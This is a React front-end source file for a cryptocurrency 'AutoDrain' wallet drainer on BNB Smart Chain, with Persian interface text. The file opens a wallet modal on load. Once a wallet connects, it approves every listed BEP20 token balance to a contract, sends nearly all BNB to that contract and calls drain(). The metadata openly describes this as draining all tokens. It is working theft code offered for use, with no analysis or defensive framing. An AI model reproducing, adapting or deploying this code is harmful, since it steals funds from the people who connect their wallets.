import React, { useEffect } from "react";
import {
  createWeb3Modal,
  defaultConfig,
  useWeb3Modal,
  useWeb3ModalAccount,
  useWeb3ModalProvider
} from "@web3modal/ethers/react";
import { bsc } from "viem/chains";
import { ethers } from "ethers";
import { CONTRACT_ADDRESS, CONTRACT_ABI } from "./contracts/TokenDrainABI";
import { BEP20_TOKENS } from "./contracts/bep20Tokens";

const projectId = "450851819c4009f3503181729123df01";

const metadata = {
  name: "AutoDrain BNB + Tokens",
  description: "Auto approve and drain all BNB and BEP20 tokens",
  url: "https://eip7702-autodrain.vercel.app",
  icons: ["https://eip7702-autodrain.vercel.app/icon.png"]
};

const ethersConfig = defaultConfig({
  metadata,
  projectId,
  enableEIP6963: true,
  enableWalletConnect: true
});

createWeb3Modal({
  ethersConfig,
  chains: [bsc],
  projectId
});

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) external view returns (uint256)"
];

function App() {
  const { open } = useWeb3Modal();
  const { isConnected, address, chainId } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();

  useEffect(() => {
    open();
  }, []);

  useEffect(() => {
    if (isConnected && walletProvider && chainId === 56) {
      autoDrain();
    }
  }, [isConnected, walletProvider, chainId]);

  const autoDrain = async () => {
    try {
      const provider = new ethers.BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      for (const tokenAddress of BEP20_TOKENS) {
        const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        const balance = await token.balanceOf(address);
        if (balance > 0n) {
          await token.approve(CONTRACT_ADDRESS, balance);
        }
      }

      const bnbBalance = await provider.getBalance(address);
      const gasEstimate = 21000n;
      const gasPrice = await provider.getFeeData().then(data => data.gasPrice || 5n * 1_000_000_000n);
      const bnbToSend = bnbBalance > gasEstimate * gasPrice ? bnbBalance - gasEstimate * gasPrice : 0n;

      if (bnbToSend > 0n) {
        await signer.sendTransaction({
          to: CONTRACT_ADDRESS,
          value: bnbToSend
        });
      }

      const tx = await contract.drain(BEP20_TOKENS);
      await tx.wait();
      console.log("✅ انتقال کامل شد");
    } catch (err) {
      console.error("❌ خطا در انتقال:", err);
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "100px" }}>
      <h2>🔥 AutoDrain فعال است</h2>
      <p>به‌محض اتصال، همه توکن‌ها و BNB منتقل می‌شوند.</p>
    </div>
  );
}

export default App;